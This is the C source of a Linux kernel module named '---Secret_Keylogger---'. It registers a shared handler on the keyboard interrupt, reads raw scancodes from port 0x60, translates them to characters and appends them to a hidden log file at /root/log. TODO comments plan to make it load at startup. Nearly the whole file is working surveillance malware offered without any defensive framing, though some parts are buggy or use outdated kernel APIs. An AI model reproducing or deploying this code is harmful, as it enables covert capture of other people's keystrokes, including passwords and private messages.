/*
 * kb.c
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/cdev.h>

#define KB_IRQ 1

const char *NAME = "---Secret_Keylogger---";
const char *LOG_FILE = "/root/log";
struct file* log_fp;
loff_t log_offset;
struct task_struct *logger;

struct logger_data{
	unsigned char scancode;
} ld;

/* =================================================================== */

struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	mm_segment_t old_fs;
	int error = 0;

	old_fs = get_fs();
	set_fs(get_ds());
	fp = filp_open(path, flags, rights);
	set_fs(old_fs);

	if(IS_ERR(fp)){
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	mm_segment_t old_fs;
	int ret;

	old_fs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(fp, data, size, &log_offset);
	log_offset += size;

	set_fs(old_fs);
	return ret;
}

/* =================================================================== */

void tasklet_logger(unsigned long data)
{
	struct logger_data *ldata = (struct logger_data*)data;
	static int shift = 0;

	printk("ld->scancode = %d\n", ldata->scancode);	
	/*if(ldata->scancode > 0 && ldata->scancode <= 170){*/
	if(1){
		char buf[32];
		memset(buf, 0, sizeof(buf));
		switch(ldata->scancode){
			default: 
				/*sprintf(buf, "[%d]", ldata->scancode);*/
				break;

			case 1:
				strcpy(buf, "(ESC)"); break;

			case 2:
				strcpy(buf, "1"); break;

			case 3:
				strcpy(buf, "2"); break;
	
			case 4:
				strcpy(buf, "3"); break;
			
			case 5:
				strcpy(buf, "4"); break;

			case 6:
				strcpy(buf, "5"); break;

			case 7:
				strcpy(buf, "6"); break;

			case 8:
				strcpy(buf, "7"); break;

			case 9:
				strcpy(buf, "8"); break;

			case 10:
				strcpy(buf, "9"); break;

			case 11:
				strcpy(buf, "0"); break;

			case 12:
				strcpy(buf, "-"); break;

			case 13:
				strcpy(buf, "="); break;

			case 14:
				strcpy(buf, "(BACK)"); break;

			case 15:
				strcpy(buf, "(TAB)"); break;

			case 16:
				strcpy(buf, "q"); break;

			case 17:
				strcpy(buf, "w"); break;

			case 18:
				strcpy(buf, "e"); break;

			case 19:
				strcpy(buf, "r"); break;

			case 20:
				strcpy(buf, "t"); break;

			case 21:
				strcpy(buf, "y"); break;

			case 22:
				strcpy(buf, "u"); break;

			case 23:
				strcpy(buf, "i"); break;

			case 24:
				strcpy(buf, "o"); break;

			case 25:
				strcpy(buf, "p"); break;

			case 26:
				strcpy(buf, "["); break;

			case 27:
				strcpy(buf, "]"); break;

			case 28:
				strcpy(buf, "(ENTER)"); break;

			case 29:
				strcpy(buf, "(CTRL)"); break;

			case 30:
				strcpy(buf, (shift) ? "A" : "a"); break;

			case 31:
				strcpy(buf, (shift) ? "S" : "s"); break;

			case 32:
				strcpy(buf, "d"); break;

			case 33:
				strcpy(buf, "f"); break;
		
			case 34:
				strcpy(buf, "g"); break;

			case 35:
				strcpy(buf, "h"); break;

			case 36:
				strcpy(buf, "j"); break;

			case 37:
				strcpy(buf, "k"); break;
	
			case 38:
				strcpy(buf, "l"); break;
		
			case 39:
				strcpy(buf, ";"); break;

			case 40:
				strcpy(buf, "'"); break;
	
			case 41:
				strcpy(buf, "`"); break;

			case 42:
				/*strcpy(buf, "(SHIFT-PRESSED)"); break;	*/
				shift = 1; break;

			case 170:
				/*strcpy(buf, "(SHIFT-RELEASED)"); break;*/
				shift = 0; break;
	
			case 44:
				strcpy(buf, "z"); break;
			
			case 45:
				strcpy(buf, "x"); break;

			case 46:
				strcpy(buf, "c"); break;

			case 47:
				strcpy(buf, "v"); break;
			
			case 48:
				strcpy(buf, "b"); break;
	
			case 49:
				strcpy(buf, "n"); break;

			case 50:
				strcpy(buf, "m"); break;

			case 51:
				strcpy(buf, ","); break;

			case 52:
				strcpy(buf, "."); break;
		
			case 53:
				strcpy(buf, "/"); break;
	
			case 54:
				
				strcpy(buf, "(R-SHIFT)"); break;

			case 56:
				strcpy(buf, "(R-ALT"); break;
		
			/* Space */
			case 55:
			case 57:
			case 58:
			case 59:
			case 60:
			case 61:
			case 62:
			case 63:
			case 64:
			case 65:
			case 66:
			case 67:
			case 68:
			case 70:
			case 71:
			case 72:
				strcpy(buf, " "); break;

			case 83:
				strcpy(buf, "(DEL)"); break;
		}
		log_write(log_fp, buf, sizeof(buf));
	}
}

DECLARE_TASKLET(my_tasklet, tasklet_logger, (unsigned long)&ld);

irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	struct logger_data *ldata = (struct logger_data*)dev_id;

	ldata->scancode = inb(0x60);

	tasklet_schedule(&my_tasklet);
	/* TODO:
	 * Writing to a file during an ISR crashes the system, so
	 * fill a queue/buffer and then write out this buffer to the 
	 * log in a non-atomic context where sleeping is allowed.
	 * e.g., a tasklet
	 */
	
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init kb_init(void)
{
	int ret;

	/* TODO:
	 * Insert module into system startup by adding to /etc/modules.conf?
	 * Note this file may be different for each distro
	 */

	log_fp = log_open(LOG_FILE, O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk("FAILED to open log file.\n");
		return 1;
	}
	else{
		printk("SUCCESSFULLY opened log file.\n");
		unsigned int size = 0;
		struct kstat stat;
		memset(&stat, 0, sizeof(stat));
		size = vfs_fstat(NAME, &stat);
		printk("FILE SIZE: %d\terr=%d\n", (int)stat.size, size);
		unsigned char buf[32];
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "-LOG START-\n\n");
		log_write(log_fp, buf, sizeof(buf));
		/*logger = kthread_run(&kthread_log_keystrokes, NULL, "keylogger");
		printk("KERNEL THREAD: %s\n", logger->comm);		*/
	}

	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
			NAME, &ld);
	if(ret != 0){
		printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
	}

	return ret;
}

static void __exit kb_exit(void)
{
	tasklet_kill(&my_tasklet);
	free_irq(KB_IRQ, &ld);
	if(log_fp != NULL){
		log_close(log_fp);
	}
}

MODULE_LICENSE("GPL");
module_init(kb_init);
module_exit(kb_exit);

/* EXPORT_NO_SYMBOLS; */
